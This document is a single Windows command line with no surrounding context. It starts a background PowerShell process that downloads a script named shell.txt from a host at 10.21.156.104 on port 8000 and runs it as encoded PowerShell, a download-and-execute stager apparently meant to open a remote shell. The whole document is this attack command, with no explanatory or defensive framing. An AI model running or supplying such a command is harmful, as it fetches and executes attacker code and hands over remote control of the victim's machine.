START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://10.21.156.104:8000/shell.txt');iex 'powershell -E $code'
